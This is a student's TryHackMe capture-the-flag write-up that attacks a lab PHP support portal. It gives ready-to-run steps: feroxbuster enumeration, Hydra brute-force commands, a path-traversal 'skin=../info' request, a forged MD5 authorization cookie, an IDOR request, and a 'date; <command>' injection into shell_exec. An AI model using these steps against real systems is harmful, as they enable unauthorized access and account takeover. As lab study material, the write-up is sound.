# README

# Support Operations Panel — TryHackMe Write-up

---

# 1. Introduction

HI! I’m Rebeca, a **cybersecurity student currently beginning my practical journey in penetration testing**. This was one of my first practical penetration-testing challenges.

The objective was to assess the **Support Operations Panel**, identify vulnerabilities in the web application, escalate privileges, obtain the administrator-level flag and ultimately command injection flag.

The challenge was particularly interesting because the vulnerabilities were not isolated. Several weaknesses could be chained together:

```
Web Enumeration
      ↓
Information Disclosure
      ↓
Weak Authentication Controls
      ↓
Cookie-based Authorization Bypass
      ↓
LFI
      ↓
Source Code Analysis
      ↓
IDOR
      ↓
Administrator Account Discovery
      ↓
Password Mutation / Brute Force
      ↓
Administrator Access Flag
      ↓
Command Injection
      ↓
Flag
```

---

# 2. Initial Enumeration

I started by enumerating the web application using **Feroxbuster**.

The command used was:

```
feroxbuster -u "http://TARGET" \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
-x php,html,json,txt \
-t 50 \
-s 301,200 \
--dont-filter
```

The scan used:

- SecLists `raft-medium-directories.txt`
- PHP/HTML/JSON/TXT extensions
- 50 threads
- HTTP status codes `200` and `301`

The scan identified several interesting resources:

```
/config.php
/includes/
/includes/skin.php
/skins/
/skins/green.php
/skins/red.php
/skins/blue.php
/index.php
/info.php
/footer.php
/layout/
/js/
```

Feroxbuster also identified directory listings in several directories:

```
/includes/
/skins/
/layout/
/js/
```

This immediately gave me a better understanding of the application's structure.    Texto colado

---

# 3. Information Disclosure — `info.php`

One of the first interesting files was:

```
/info.php
```

The page exposed PHP configuration information.

Some relevant information included:

```
PHP Version: 8.3.6
OS: Linux Ubuntu
Server: Apache 2.0
```

It also exposed configuration values such as:

```
allow_url_include = Off
display_errors = Off
file_uploads = On
session.upload_progress.enabled = On
session.use_strict_mode = Off
disable_functions = no value
open_basedir = no value
```

These values were useful for understanding the environment and identifying potential attack surfaces.  

---

# 4. Initial Access

The login page provided the following corporate email:

```
help@support.thm
```

I checked whether the application enforced any apparent rate limiting on login attempts.

No effective limitation was observed during the testing.

I therefore performed a controlled password attack using Hydra:

```
hydra -l help@support.thm \
-P /usr/share/wordlists/rockyou.txt \
TARGET \
http-post-form "/:email=^USER^&password=^PASS^:F=Employee Authentication" \
-vV -t 4
```

This resulted in valid credentials for a **non-administrative account**.

The initial account had limited functionality.   

---

# 5. Local File Inclusion / File Disclosure

The dashboard contained a theme-selection parameter:

```
/dashboard.php?skin=
```

The relevant source code was:

```
$webRoot = realpath('/var/www/html/skins');
$another = realpath('/var/www/html');
$requested = realpath($webRoot . '/' . $skin . '.php');

if ($requested !== false && strpos($requested, $another) === 0) {
    readfile($requested);
}
```

The application intended to load theme files from:

```
/var/www/html/skins/
```

However, the user-controlled `skin` parameter was passed through path resolution.

I tested:

```
GET /dashboard.php?skin=../info
```

This caused the application to resolve:

```
/var/www/html/skins/../info.php
```

to:

```
/var/www/html/info.php
```

and then execute:

```
readfile($requested);
```

The PHP source was therefore returned as plain text.

This confirmed a **Local File Disclosure / path traversal-style issue**, although the implementation contains a `realpath()` and base-directory check that restricts the resulting file to `/var/www/html`.    

---

# 6. Cookie-Based Authorization

After logging in, I inspected the application's cookies.

One interesting cookie was:

```
isITUser
```

Its value was:

```
68934a3e9455fa72420237eb05902327
```

This was recognized as an MD5 hash corresponding to:

```
false
```

The corresponding MD5 value for `true` is:

```
b326b5062b2f0e69046810717534cb09
```

After replacing the cookie value, the restricted functionality became accessible.   

### Vulnerability

**Client-side authorization / insecure trust in a client-controlled cookie.**

The important distinction is:

```
isITUser = true
```

does **not** necessarily mean:

```
$_SESSION['admin'] = true
```

These are separate mechanisms.

---

# 7. Internal User API

After modifying the cookie, I gained access to the Internal User API.

The source code showed:

```
$id = $_GET['id'] ?? $_SESSION['user_id'];
$user = $users[$id] ?? null;
```

The application then checks whether the request path starts with:

```
/user/
```

and returns the selected user's information:

```
if (preg_match('#^/user/#', $_SERVER['REQUEST_URI'])) {
    header('Content-Type: application/json');

    unset($user['password']);

    echo json_encode($user, JSON_PRETTY_PRINT);
    exit;
}
```

This immediately suggested that the `id` parameter might be controllable.

---

# 8. IDOR

The application indicated that a helpdesk user could access their own profile through:

```
/user/<ID>
```

The authenticated account corresponded to one user ID.

I changed the identifier to:

```
GET /user/1
```

The application returned information belonging to another user.

The response revealed:

```
Email: specialadmin@support.thm
Admin: true
2FA: false
```

The password was explicitly removed by:

```
unset($user['password']);
```

Therefore, the password was not directly exposed.

This was an **IDOR (Insecure Direct Object Reference)** because the application allowed me to select another user's object by changing the identifier without verifying whether I was authorized to access that account.    Texto colado

The attack chain at this point was:

```
Initial User
     ↓
Modify isITUser cookie
     ↓
Internal User API
     ↓
/user/1
     ↓
specialadmin@support.thm
     ↓
admin = true
```

---

# 9. Source Code Analysis

At this point, source-code analysis became particularly useful.

## `index.php`

The login process is:

```
include('/var/www/db.php');

foreach ($users as $id => $user) {
    if ($user['email'] === $email && $user['password'] === $password) {

        $_SESSION['loggedin'] = true;
        $_SESSION['user_id']  = $id;
        $_SESSION['admin']    = $user['admin'];
```

This revealed an important fact:

```
/var/www/db.php
```

contains the $users structure used for authentication.

The administrator's account is therefore stored in the same data structure that the login mechanism uses.

---

# 10. `config.php`

Using the file disclosure functionality, I also examined:

```
/config.php
```

It contained:

```
$MASTER_PASSWORD = '[REDACTED]';

$SITE_VER = '1.0';
$SITE_NAME = 'support_portal';
```

I tested the discovered password against the administrator account:

```
specialadmin@support.thm
```

but authentication failed.

This indicated that the `MASTER_PASSWORD` was **not simply the administrator's password**, at least not in the tested authentication flow.

---

# 11. Password Mutation

Since I already had:

```
specialadmin@support.thm
```

and a password value found in the configuration, I generated password mutations using John the Ripper.

First:

```
echo "support@110" > palavra_base.txt
```

Then:

```
john --wordlist=base.txt \
--rules=Wordlist \
--stdout > minhas_mutacoes.txt
```

This generated a custom wordlist based on the known password.

I then used the generated list against the administrator account:

```
hydra \
-l specialadmin@support.thm \
-P minhas_mutacoes.txt \
TARGET \
http-post-form \
"/index.php:email=^USER^&password=^PASS^:Invalid credentials"
```

The attack successfully identified valid administrator credentials.

At this point I could authenticate normally as the administrator.

---

# 12. Administrator Access

Once authenticated as the administrator, the application created:

```
$_SESSION['admin'] = $user['admin'];
```

Because the administrator account has:

```
admin = true
```

the dashboard displayed the administrator-only section.

The relevant code was:

```
if (isset($_SESSION['admin']) && $_SESSION['admin'] === true) {
```

The application then reads:

```
file_get_contents('/var/www/web.txt')
```

and displays its contents.

Therefore, the first flag is obtained after establishing a genuine administrator session.

---

# 13. Command Injection

The next interesting functionality was located in `footer.php`.

The application determines whether the current user is an administrator:

```
$isAdmin = $_SESSION['admin'];
```

Then it processes the `sys` POST parameter:

```
if ($isAdmin &&
    $_SERVER['REQUEST_METHOD'] === 'POST' &&
    isset($_POST['sys'])) {

    $selectedSys = $_POST['sys'];
    $sys = $_POST['sys'];

    if (strpos($sys, 'date') === 0) {
        $output = shell_exec($sys);
    } else {
        $error = 'Only date command is allowed.';
    }
}
```

The application therefore performs:

```
User input
    ↓
strpos($sys, 'date') === 0
    ↓
shell_exec($sys)
```

The intended restriction was:

```
Only date command is allowed.
```

However, the application only checks whether the input **starts with** `date`.

It does not enforce that the complete value is exactly a safe `date` command.

This creates a command-injection vulnerability.

---

# 14. Exploiting the Command Injection

The normal interface sends a POST request containing:

```
sys=date
```

or:

```
sys=date +"%H:%M:%S"
```

I intercepted this request with Burp Suite.

Because the server only checks:

```
strpos($sys, 'date') === 0
```

I modified the value so that it continued to begin with `date`, while appending an additional shell command.

Conceptually:

```
date; <additional command>
```

The server then passed the entire value to:

```
shell_exec()
```

This allowed command execution in the context of the web server.

I used this functionality to read the flag file required by the challenge.

---

# 15. Final Attack Chain

The complete attack chain was:

```
                 Web Enumeration
                       │
                       ▼
                info.php exposed
                       │
                       ▼
             Environment disclosure
                       │
                       ▼
              Weak login controls
                       │
                       ▼
               Initial user access
                       │
                       ▼
            isITUser cookie analysis
                       │
                       ▼
             Cookie authorization
                  bypassed
                       │
                       ▼
              Internal User API
                       │
                       ▼
                    IDOR
                       │
                       ▼
          Administrator email discovered
                       │
                       ▼
             Password mutation
                       │
                       ▼
           Administrator credentials
                       │
                       ▼
             Administrator login
                       │
              ┌────────┴─────────┐
              ▼                  ▼
         web.txt             footer.php
              │                  │
              ▼                  ▼
          Flag #1          shell_exec()
                                 │
                                 ▼
                         Command Injection
                                 │
                                 ▼
                              Flag #2
```

---

# 16. Vulnerabilities Identified

| Vulnerability | Description |
| --- | --- |
| Information Disclosure | `info.php` exposed PHP/environment information |
| Directory Listing | Several application directories were browsable |
| Weak Authentication Controls | No effective rate limiting was observed |
| Client-Side Authorization | `isITUser` authorization relied on a client-controlled cookie |
| IDOR | `/user/<ID>` allowed access to other users' information |
| Local File Disclosure | `dashboard.php?skin=` allowed reading PHP files within the permitted base directory |
| Weak Command Validation | `strpos($sys, 'date') === 0` only validated the beginning of the command |
| OS Command Injection | User-controlled input was passed to `shell_exec()` |

---

# 17. Key Takeaways

The most important lesson from this challenge was that the individual vulnerabilities were relatively simple, but **chaining them together was what produced the compromise**.

The attack did not depend on a single critical vulnerability:

```
Information disclosure
        +
Weak authorization
        +
IDOR
        +
Credential discovery
        +
Command injection
```

created a complete attack path.

Another important lesson was the value of **source-code analysis**. Once the PHP files became available, it was possible to understand the application's trust boundaries and distinguish between:

```
$_SESSION['admin']
```

and:

```
$_COOKIE['isITUser']
```

That distinction was essential to understanding why modifying the cookie provided access to the Internal API but did not, by itself, create a true administrator session.

---